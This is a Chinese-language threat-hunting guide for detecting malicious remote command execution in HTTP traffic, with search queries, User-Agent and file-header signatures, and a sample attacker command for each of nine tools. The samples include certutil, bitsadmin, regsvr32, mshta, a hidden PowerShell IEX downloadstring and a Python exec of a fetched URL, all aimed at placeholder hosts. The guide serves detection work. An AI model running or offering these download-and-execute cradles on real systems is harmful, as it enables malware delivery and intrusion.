# 高频命令研判

攻击者利用漏洞远程执行命令时，会产生特定流量特征，可通过User-Agent和响应内容识别恶意命令执行。

## 通用检索语句

```
(user_agent:*CertUtil* AND r_body:MZ *)
(user_agent:*BITS* AND r_body:MZ *)
(user_agent:*Mozilla*compatible*Triden*NET* AND r_body:*scriptlet*)
(user_agent:*Mozilla*compatible*Triden*NET* AND (r_body:*Wscript.Shell* OR r_body:*VBScript* OR r_body:*CreateObject*))
(user_agent:*Wget* OR user_agent:*curl) AND (r_body:*ELF* OR r_body:*socket* OR r_body:*exec* OR (r_body:*dev* AND r_body:*tcp*)))
(user_agent:*Java* AND r_body:*java*)
(user_agent:*Python* AND (r_body:*exec* OR r_body:*socket*))
(protocol_type:"http" AND (user_agent:*WindowsPowerShell* OR user_agent:"") AND (r_body:*New-Object* OR r_body:*Decompress* OR r_body:*Assembly* OR r_body:*nishang* OR r_body:*PowerSploit* OR r_body:MZ *))
```

---

## 1. certutil

**用途**：Windows下载恶意文件

**命令示例**：
```
certutil -urlcache -split -f http://xxx.xxx.xxx.xxx/xxx.exe C:\Windows\Temp\xxx.exe
```

**特征识别**：
- 发起两个请求
- 第一个请求User-Agent：`Microsoft-CryptoAPI/版本号`
- 第二个请求User-Agent：`CertUtil URL Agent`

**恶意文件特征**：
- exe/dll文件头：`4D5A`（MZ）

**检索语句**：`user_agent:*CertUtil* AND r_body:MZ *`

**图片参考**：image_161 ~ image_168

---

## 2. bitsadmin

**用途**：Windows下载恶意文件

**命令示例**：
```
bitsadmin /transfer n http://xxx.xxx.xxx.xxx/xxx.exe C:\Windows\Temp\xxx.exe
```

**特征识别**：
- 第一个请求：HEAD方法探测资源，User-Agent：`Microsoft BITS/版本号`
- 后续请求：User-Agent相同

**恶意文件特征**：
- exe/dll文件头：`4D5A`（MZ）

**检索语句**：`user_agent:*BITS* AND r_body:MZ *`

**图片参考**：image_169 ~ image_172

---

## 3. regsvr32

**用途**：加载远程DLL

**命令示例**：
```
regsvr32 /s /n /u /i:http://xxx.xxx.xxx.xxx/SWyNnnBafgin.sct scrobj.dll
```

**特征识别**：
- User-Agent包含：Mozilla、compatible、MSIE、Windows、Trident、.NET
- 响应XML结构特征：
```xml
<?XML version="1.0"?>
<scriptlet>
</registration progid="xxxx
<script>
</script>
</registration>
</scriptlet>
```

**Cobalt Strike响应**：特定XML结构
**Metasploit响应**：特定XML结构

**检索语句**：`user_agent:*Mozilla*compatible*Triden*NET* AND r_body:*scriptlet*`

**图片参考**：image_173 ~ image_176

---

## 4. mshta

**用途**：执行远程恶意hta文件

**命令示例**：
```
mshta http://xxx.xxx.xxx.xxx/xxx.hta
```

**特征识别**：
- 64位系统有`UA-CPU: AMD64`字段
- User-Agent包含：Mozilla、compatible、MSIE、Windows、Trident、.NET
- 响应Content-Type：`application/hta`
- 恶意hta包含：VBScript、CreateObject、Wscript.Shell

**检索语句**：`user_agent:*Mozilla*compatible*Triden*NET* AND (r_body:*Wscript.Shell* OR r_body:*VBScript* OR r_body:*CreateObject*)`

**图片参考**：image_177 ~ image_180

---

## 5. powershell

**用途**：多种远程下载方式

**命令示例**：
```powershell
# webclient方式
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.16.136:80/p'))"

# Invoke-WebRequest方式
powershell Invoke-WebRequest -Uri "http://xxx.xxx.xxx.xxx/download/file.ext" -OutFile "C:\Windows\Temp\ttt.exe"
```

**特征识别**：
- webclient方式：无明显User-Agent特征
- Invoke-WebRequest方式：User-Agent包含PowerShell（wget/curl是别名）

**恶意内容特征**：
- New-Object、Decompress、Assembly、nishang、PowerSploit、MZ *

**检索语句**：`protocol_type:"http" AND (user_agent:*WindowsPowerShell* OR user_agent:"") AND (r_body:*New-Object* OR r_body:*Decompress* OR r_body:*Assembly* OR r_body:*nishang* OR r_body:*PowerSploit* OR r_body:MZ *)`

**图片参考**：image_181 ~ image_183

---

## 6. wget

**用途**：Linux下载远程文件

**命令示例**：
```
wget -O /tmp/xxx http://xxx.xxx.xxx.xxx/xxx
```

**特征识别**：
- User-Agent包含`Wget`

**恶意文件特征**：
- ELF文件头：`7F454C46`
- 反弹shell脚本：bash、python、perl
- 脚本特征：socket、exec、/dev/tcp

**检索语句**：`user_agent:*Wget* AND (r_body:*ELF* OR r_body:*socket* OR r_body:*exec* OR (r_body:*dev* AND r_body:*tcp*))`

**图片参考**：image_184 ~ image_185

---

## 7. curl

**用途**：Linux下载远程文件

**命令示例**：
```
curl http://xxx.xxx.xxx.xxx/xxx -o /tmp/xxx
```

**特征识别**：
- User-Agent包含`curl`

**恶意文件特征**：
- 与wget相同

**检索语句**：`user_agent:*curl* AND (r_body:*ELF* OR r_body:*socket* OR r_body:*exec* OR (r_body:*dev* AND r_body:*tcp*))`

**图片参考**：image_186

---

## 8. Java

**用途**：加载远程class文件（JND I注入、Log4j漏洞等）

**命令示例**：
- Log4j CVE-2021-44228等

**特征识别**：
- User-Agent包含`Java`
- 响应包含class文件头：`cafebabe`

**class文件敏感类**：
- 命令执行：`java/lang/Runtime`、`java/lang/ProcessBuilder`
- 网络通信：`java/net`
- 文件操作：`java/io/FileInputStream`、`java/io/FileOutputStream`、`java/io/File`

**检索语句**：`user_agent:*Java* AND r_body:*java*`

**图片参考**：image_187 ~ image_188

---

## 9. Python

**用途**：远程代码执行（Cobalt Strike python投递等）

**命令示例**：
```python
python -c "import urllib2; exec urllib2.urlopen('http://xxx.xxx.xxx.xxx:80/py').read();"
```

**特征识别**：
- User-Agent：`Python-urllib/版本号`
- 响应内容特征：exec、socket

**检索语句**：`user_agent:*Python* AND (r_body:*exec* OR r_body:*socket*)`

**图片参考**：image_189 ~ image_190

---

## 文件恢复方法

对检测出的可疑流量，可通过以下方法恢复下载的文件进行分析：

1. 提取响应体
2. 进行两次base64解码
3. 获取原始文件
4. 可上传VirusTotal等平台进行检测
